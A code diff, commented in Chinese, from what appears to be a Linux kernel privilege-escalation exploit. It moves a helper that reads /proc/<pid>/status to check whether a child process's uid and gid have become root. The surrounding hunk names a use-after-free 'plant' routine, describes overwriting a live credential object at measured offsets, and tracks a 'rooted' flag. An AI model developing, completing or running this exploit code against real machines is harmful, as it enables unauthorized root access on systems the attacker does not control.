@@ -1867,6 +1867,30 @@ static void log_proc_uid(pid_t pid)
 	fclose(file);
 }
 
+/* 2.0.39：/proc/<pid>/status 的 Uid:/Gid: 行给全部四个身份字段
+ * （real/effective/saved/fs），无需 child 配合即可验证任何字段对。
+ * uids[0..3]=uid/euid/suid/fsuid，gids[0..3]=gid/egid/sgid/fsgid。 */
+static int read_child_ids(unsigned uids[4], unsigned gids[4])
+{
+	char path[64], line[160];
+	FILE *file;
+	int have_u = 0, have_g = 0;
+	snprintf(path, sizeof(path), "/proc/%d/status", (int)g_cred_child_pid);
+	file = fopen(path, "r");
+	if (!file)
+		return -1;
+	while (fgets(line, sizeof(line), file)) {
+		if (!have_u && !strncmp(line, "Uid:", 4))
+			have_u = sscanf(line + 4, "%u %u %u %u",
+				&uids[0], &uids[1], &uids[2], &uids[3]) == 4;
+		else if (!have_g && !strncmp(line, "Gid:", 4))
+			have_g = sscanf(line + 4, "%u %u %u %u",
+				&gids[0], &gids[1], &gids[2], &gids[3]) == 4;
+	}
+	fclose(file);
+	return have_u && have_g ? 0 : -1;
+}
+
 static int ask_child(unsigned *uid, unsigned *euid, unsigned *gid, unsigned *egid)
 {
 	char buf[80];
@@ -2310,30 +2334,6 @@ int uaf_plant_main(int argc, char **argv)
 	 * req=176/alloc=192，BTF 实测）。usage@0 不触碰，对象保持有效。
 	 * 写目标是活对象的非指针字段，即使目标抓错也不会踩野指针。
 	 */
-	/* 2.0.39：/proc/<pid>/status 的 Uid:/Gid: 行给全部四个身份字段
-	 * （real/effective/saved/fs），无需 child 配合即可验证任何字段对。
-	 * uids[0..3]=uid/euid/suid/fsuid，gids[0..3]=gid/egid/sgid/fsgid。 */
-	static int read_child_ids(unsigned uids[4], unsigned gids[4])
-	{
-		char path[64], line[160];
-		FILE *file;
-		int have_u = 0, have_g = 0;
-		snprintf(path, sizeof(path), "/proc/%d/status", (int)g_cred_child_pid);
-		file = fopen(path, "r");
-		if (!file)
-			return -1;
-		while (fgets(line, sizeof(line), file)) {
-			if (!have_u && !strncmp(line, "Uid:", 4))
-				have_u = sscanf(line + 4, "%u %u %u %u",
-					&uids[0], &uids[1], &uids[2], &uids[3]) == 4;
-			else if (!have_g && !strncmp(line, "Gid:", 4))
-				have_g = sscanf(line + 4, "%u %u %u %u",
-					&gids[0], &gids[1], &gids[2], &gids[3]) == 4;
-		}
-		fclose(file);
-		return have_u && have_g ? 0 : -1;
-	}
-
 	int rooted = 0;
 	/* 2.0.39：字段感知重试。第 16 次实测暴露两个浪费：① uid/gid 早在第 3
 	 * 轮就清零（EPERM 已触发），但旧循环每轮仍固定花一个周期重清它；
